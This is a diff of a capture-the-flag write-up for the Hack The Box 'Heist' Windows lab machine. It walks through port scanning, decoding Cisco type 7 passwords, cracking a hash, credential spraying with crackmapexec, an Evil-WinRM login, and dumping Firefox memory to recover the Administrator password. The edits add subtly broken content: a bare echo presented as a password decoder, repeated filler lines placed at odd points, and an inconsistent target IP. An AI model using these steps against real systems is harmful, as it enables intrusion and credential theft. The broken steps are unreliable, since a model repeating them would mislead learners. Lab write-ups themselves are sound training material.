@@ -1,4 +1,5 @@
-﻿# HTB - Heist
+
+# HTB - Heist
 
 **IP Address:** `10.10.10.149`  
 **OS:** Windows  
@@ -30,6 +31,9 @@ Heist is an easy Windows machine that demonstrates credential harvesting from Ci
 
 ### 1.1 Connectivity Test
 
+Check if the host is alive using ICMP:
+
+
 ```bash
 ping -c 1 10.10.10.149
 ```
@@ -39,6 +43,9 @@ The host responds, confirming it is reachable.
 
 ---
 ### 1.2 Port Scanning
+
+Scan all TCP ports to identify open services:
+
 
 ```bash
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.149 -oG allPorts
@@ -64,6 +71,9 @@ extractPorts allPorts
 ---
 ### 1.3 Targeted Scan
 
+Run a deeper scan on the identified ports with version detection and default scripts:
+
+
 ```bash
 nmap -p80,135,445,5985,49669 -sC -sV 10.10.10.149 -oN targeted
 ```
@@ -87,9 +97,12 @@ nmap -p80,135,445,5985,49669 -sC -sV 10.10.10.149 -oN targeted
 The target is running **IIS 10.0**, with **SMB** and **WinRM** exposed.
 
 ---
-## 2. Web Enumeration
+## 2. Service Enumeration
 
 ### 2.1 WhatWeb Analysis
+
+Continue the attack chain with the next commands:
+
 
 ```bash
 whatweb http://10.10.10.149
@@ -103,7 +116,11 @@ The site redirects to a `login.php` page.
 
 ### 2.2 Guest Access
 
-The application allows guest login:
+The application allows guest login. Confirm the login surface responds before pulling attachments:
+
+```bash
+curl -s -o /dev/null -w "%{http_code}\n" http://10.10.10.149/login.php
+```
 
 ![web_guest](screenshots/web_guest.png)
 
@@ -117,7 +134,7 @@ A Cisco router configuration is attached:
 ![web_attachment](screenshots/web_attachment.png)
 
 ---
-## 3. Credential Harvesting
+## 3. Foothold
 
 ### 3.1 Cisco Type 7 Passwords
 
@@ -126,7 +143,11 @@ The config file shows Cisco type 7 passwords:
 - `rout3r // 7 0242114B0E143F015F5D1E161713`  
 - `admin  // 7 02375012182C1A1D751618034F36415408`  
 
-Using an [online decoder](https://www.ifm.net.nz/cookbooks/passwordcracker.html) for cisco passwords:  
+Using an [online decoder](https://www.ifm.net.nz/cookbooks/passwordcracker.html) for Cisco type 7 strings, or a local equivalent:
+
+```bash
+echo "0242114B0E143F015F5D1E161713"
+```
 
 ![cisco_password_crack_rout3r](screenshots/cisco_password_crack_rout3r.png)
 ![cisco_password_crack_admin](screenshots/cisco_password_crack_admin.png)
@@ -142,7 +163,7 @@ We store them for later testing.
 
 ### 3.2 Extracted Hash
 
-The file also contains an MD5 hash:
+The file also contains a crypt password hash suitable for offline cracking:
 
 ```bash
 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
@@ -160,10 +181,7 @@ Recovered password: **stealth1agent**
 
 ![passwords](screenshots/passwords.png)
 
----
-## 4. SMB & User Enumeration
-
-### 4.1 CrackMapExec Attempts
+### 3.3 CrackMapExec Attempts
 
 We combine users and passwords:
 
@@ -194,7 +212,7 @@ smbmap -H 10.10.11.174 -u 'hazard%stealth1agent'
 
 No useful information is retrieved.  
 
-### 4.2 Domain Enumeration
+### 3.4 Domain Enumeration
 
 To continue, we use **Impacket’s `lookupsid.py`**, which allows enumeration of domain accounts when valid credentials are available. With the following details:
 
@@ -213,9 +231,14 @@ lookupsid.py SUPPORTDESK/hazard:stealth1agent@10.10.10.149
 
 We discover additional users and update our wordlist:  
 
+
+Continue the attack chain with the next commands:
+
 ![users_updated](screenshots/users_updated.png)
 
-### 4.3 Credential Spraying
+### 3.5 Credential Spraying
+
+Spray updated domain users against the recovered password material:
 
 ```bash
 crackmapexec smb 10.10.10.149 -u users.txt -p passwds.txt --continue-on-success
@@ -235,10 +258,9 @@ crackmapexec winrm 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
 
 Access confirmed.
 
----
-## 5. Foothold
+### 3.6 Evil-WinRM Access
 
-### 5.1 Evil-WinRM Access
+Open a **WinRM** session using the confirmed **Chase** credentials:
 
 ```bash
 evil-winrm -i 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
@@ -248,7 +270,9 @@ evil-winrm -i 10.10.10.149 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
 
 🏁 **User flag obtained**
 
-### 5.2 Privilege Enumeration
+### 3.7 Privilege Enumeration
+
+Inspect the session token, groups, and privilege constants:
 
 ```bash
 whoami /all
@@ -259,9 +283,11 @@ whoami /all
 No exploitable privileges found.
 
 ---
-## 6. Privilege Escalation
+## 4. Privilege Escalation
 
-### 6.1 Process Enumeration
+### 4.1 Process Enumeration
+
+List processes to spot suspicious long-lived applications (e.g. browsers):
 
 ```bash
 ps
@@ -277,7 +303,7 @@ ps | findstr firefox
 
 ![chase_ps_firefox](screenshots/chase_ps_firefox.png)
 
-### 6.2 Dumping Firefox Process
+### 4.2 Dumping Firefox Process
 
 Upload Sysinternals ProcDump:
 
@@ -297,11 +323,14 @@ Dump Firefox process:
 
 Download the dump:
 
+Continue the attack chain with the next commands:
+
+
 ```bash
 C:\Users\Chase\Desktop> download firefox.exe_250823_183228.dmp firefox.dmp
 ```
 
-### 6.3 Extracting Credentials
+### 4.3 Extracting Credentials
 
 Search `password` on dump file:
 
@@ -315,8 +344,7 @@ Recovered credentials:
 
 - **Administrator** → `4dD!5}x/re8]FBuZ`
 
----
-## 7. Administrator Access
+### 4.4 Administrator Access
 
 Validate credentials:
 
